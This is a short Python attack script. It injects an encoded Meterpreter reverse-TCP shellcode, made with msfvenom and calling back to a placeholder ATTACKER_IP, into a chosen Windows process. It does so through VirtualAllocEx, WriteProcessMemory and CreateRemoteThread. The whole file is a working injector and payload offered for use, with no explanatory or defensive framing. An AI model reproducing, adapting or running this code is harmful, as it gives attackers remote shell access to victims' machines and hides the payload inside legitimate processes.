from process_injector import ProcessInjector
from argparse import ArgumentParser

if __name__ == "__main__":
    parser = ArgumentParser()
    parser.add_argument(
        "-p", "--pid",
        action="store_true",
        help="PROC will be a PID instead of a process name"
    )
    parser.add_argument("PROC", help="the target process")

    args = parser.parse_args()
    # msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[ATTACKER_IP] LPORT=[ATTACKER_PORT] EXITFUNC=thread -f python -b '\x00' –e x86/shikata_ga_nai
    """
    DONT FORGET TO TRY THIS WITH A NON-METERPRETER PAYLOAD !!!
    """
    buf =  ""
    buf += "\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05"
    buf += "\xef\xff\xff\xff\x48\xbb\x80\x7a\x63\x21\x82\x81\x36"
    buf += "\x0e\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
    buf += "\x7c\x32\xe0\xc5\x72\x69\xfa\x0e\x80\x7a\x22\x70\xc3"
    buf += "\xd1\x64\x5f\xc8\x4b\xb1\x77\xe7\xc9\xbd\x5c\xe0\x32"
    buf += "\xe8\x73\x9a\xc9\xbd\x5c\xa0\x37\x52\xe8\xca\x8e\x81"
    buf += "\x44\xca\x32\xe8\x53\xd2\xc9\x07\xce\x2c\x46\x02\x5d"
    buf += "\x80\xad\x16\x4f\x41\xb3\x6e\x60\x83\x40\xd4\xe3\xd2"
    buf += "\x32\xe8\x73\xa2\xc0\x67\x85\xc2\x46\x2b\x20\x52\xe7"
    buf += "\xb7\x76\x98\x71\x61\x2e\x07\xf3\x36\x0e\x80\xf1\xe3"
    buf += "\xa9\x82\x81\x36\x46\x05\xba\x17\x46\xca\x80\xe6\x85"
    buf += "\xc8\x62\x27\xaa\xc2\xa1\x66\x47\x81\xaa\x80\x77\xca"
    buf += "\x7e\xff\x43\xb1\xb3\x22\xaa\xb6\x09\x7e\x0f\x56\x32"
    buf += "\x52\xe1\xc3\x40\xff\x03\x2c\x3b\x62\xe0\xba\x61\x43"
    buf += "\xff\xcc\x79\x2f\x05\x8a\xc4\x0f\xdf\xf5\xa2\x3b\x65"
    buf += "\x09\xc1\x12\x47\x81\xaa\x05\x60\x09\x8d\x7e\x4a\x0b"
    buf += "\x3a\x7f\x68\x83\x51\x77\x85\x84\xf2\x2b\x20\x52\xc0"
    buf += "\x6e\x4f\xd8\x24\x3a\x7b\xc3\xd9\x77\x57\xc1\x20\x2b"
    buf += "\xa2\x6e\xa1\x77\x5c\x7f\x9a\x3b\x60\xdb\xdb\x7e\x85"
    buf += "\x92\x93\x28\xde\x7d\x7e\x6b\x47\x3e\x0d\x10\x13\xdd"
    buf += "\xb2\x04\x0e\x80\x3b\x35\x68\x0b\x67\x7e\x8f\x6c\xda"
    buf += "\x62\x21\x82\xc8\xbf\xeb\xc9\xc6\x61\x21\xa0\x39\xf6"
    buf += "\xa6\xa1\xfa\x22\x75\xcb\x08\xd2\x42\x09\x8b\x22\x9b"
    buf += "\xce\xf6\x10\x09\x7f\xaf\x2f\xa8\x68\xe9\x37\x0f\x80"
    buf += "\x7a\x3a\x60\x38\xa8\xb6\x65\x80\x85\xb6\x4b\x88\xc0"
    buf += "\x68\x5e\xd0\x37\x52\xe8\xcf\xb0\xf6\x46\x7f\xba\x2b"
    buf += "\xa8\x40\xc9\xc9\xce\xc8\xf3\xa2\x60\x38\x6b\x39\xd1"
    buf += "\x60\x85\xb6\x69\x0b\x46\x5c\x1e\xc1\x22\x2f\xa8\x60"
    buf += "\xc9\xbf\xf7\xc1\xc0\xfa\x84\xf6\xe0\xc9\xdb\x05\xba"
    buf += "\x17\x2b\xcb\x7e\xf8\x7b\x65\x92\xf0\x21\x82\x81\x7e"
    buf += "\x8d\x6c\x6a\x2b\xa8\x60\xcc\x07\xc7\xea\x7e\x22\x79"
    buf += "\xca\x08\xcf\x4f\x3a\x78\xba\xe9\xdd\x7e\xe3\x8d\x78"
    buf += "\x7a\x1d\x74\xca\x02\xf2\x2e\xde\xf3\x95\x4b\xc2\xc0"
    buf += "\x6f\x66\x80\x6a\x63\x21\xc3\xd9\x7e\x87\x72\x32\x52"
    buf += "\xe8\xc3\x3b\x6e\xaa\xd3\x9f\x9c\xf4\xca\x08\xf5\x47"
    buf += "\x09\xbd\x2e\x10\x4b\xc8\xbf\xfe\xc8\xf3\xb9\x69\x0b"
    buf += "\x78\x77\xb4\x82\xa3\xab\x7e\x7d\x54\xb5\xf6\x80\x07"
    buf += "\x4b\x79\xc3\xd6\x6f\x66\x80\x3a\x63\x21\xc3\xd9\x5c"
    buf += "\x0e\xda\x3b\xd9\x2a\xad\x8e\x06\xf1\x55\x2d\x3a\x60"
    buf += "\x38\xf4\x58\x43\xe1\x85\xb6\x68\x7d\x4f\xdf\x32\x7f"
    buf += "\x85\x9c\x69\x83\x42\x7e\x27\x46\x32\xe6\xd7\xf7\x35"
    buf += "\x77\xf1\x67\x22\x09\x21\xdb\x3a\xd6\x13\xaa\x70\x22"
    buf += "\xa8\x58\x7e\xe3\x0e"
   
    with ProcessInjector(args.PROC, pid=args.pid) as ps_handle:
        # Allocating memory in target process with VirtualAllocEx
        base_addr = ps_handle.virtual_alloc_ex(len(buf))
        print(f"Base Address @ {base_addr}")
        print("[+] Writing data into allocated memory...")
        ps_handle.write_process_memory(buf, len(buf))
        print("[+] Creating remote thread...")
        ps_handle.create_remote_thread()
        print("[+] Remote process memory injection Successful ...")
